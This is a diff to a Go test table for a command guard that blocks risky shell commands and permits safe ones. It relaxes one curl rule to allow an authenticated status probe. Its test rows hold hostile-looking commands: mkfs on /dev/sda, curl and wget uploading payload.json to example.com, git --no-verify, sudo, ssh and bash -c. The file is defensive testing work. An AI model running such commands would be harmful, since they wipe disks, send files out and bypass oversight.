@@ -122,13 +122,22 @@ func TestSharedGuardBlocksDenyFloorAndAllowsSafeCompound(t *testing.T) {
 		{name: "blocks mkfs", commandLine: concat("mkfs", ".ext4 /dev/sda"), wantStatus: 2, wantOutput: "BLOCKED [D6]"},
 		{name: "blocks git reset hard", commandLine: concat("git reset --", "hard HEAD"), wantStatus: 2, wantOutput: "BLOCKED [D7]"},
 		{name: "blocks commit hook bypass", commandLine: concat("git commit --no-", "verify -m test"), wantStatus: 2, wantOutput: "BLOCKED [D8]"},
-		{name: "blocks exfil command", commandLine: concat("cu", "rl https://example.com"), wantStatus: 2, wantOutput: "BLOCKED [D11]"},
+		{
+			name: "allows response-suppressed authenticated curl probe",
+			commandLine: `curl --silent --show-error --output /dev/null ` +
+				`--write-out 'http_status=%{http_code} total_seconds=%{time_total}\n' ` +
+				`--user "${GONG_API_ID}:${GONG_API_SECRET}" https://api.gong.io/v2/users`,
+			wantStatus: 0,
+			wantOutput: "",
+		},
+		{name: "blocks curl request data", commandLine: concat("cu", "rl --data @payload.json https://example.com"), wantStatus: 2, wantOutput: "BLOCKED [D11]"},
+		{name: "blocks wget request data", commandLine: concat("wg", "et --post-file payload.json https://example.com"), wantStatus: 2, wantOutput: "BLOCKED [D11]"},
 		{name: "blocks sudo", commandLine: concat("su", "do ls"), wantStatus: 2, wantOutput: "BLOCKED [D12]"},
 		{name: "blocks remote shell", commandLine: concat("s", "sh prod"), wantStatus: 2, wantOutput: "BLOCKED [D13]"},
 		{name: "blocks destructive docker", commandLine: concat("docker system pr", "une -f"), wantStatus: 2, wantOutput: "BLOCKED [D14]"},
 		{name: "blocks shell history", commandLine: concat("hist", "ory"), wantStatus: 2, wantOutput: "BLOCKED [D15]"},
 		{name: "blocks interpreter command", commandLine: concat("ba", "sh -c 'echo hi'"), wantStatus: 2, wantOutput: "BLOCKED [D16]"},
-		{name: "blocks dangerous compound", commandLine: concat("git status && ", "cu", "rl https://example.com"), wantStatus: 2, wantOutput: "BLOCKED [D11]"},
+		{name: "blocks dangerous compound", commandLine: concat("git status && ", "cu", "rl --upload-file payload.json https://example.com"), wantStatus: 2, wantOutput: "BLOCKED [D11]"},
 		{name: "allows safe compound", commandLine: concat("git status && ", "printf ok"), wantStatus: 0, wantOutput: ""},
 	}
 
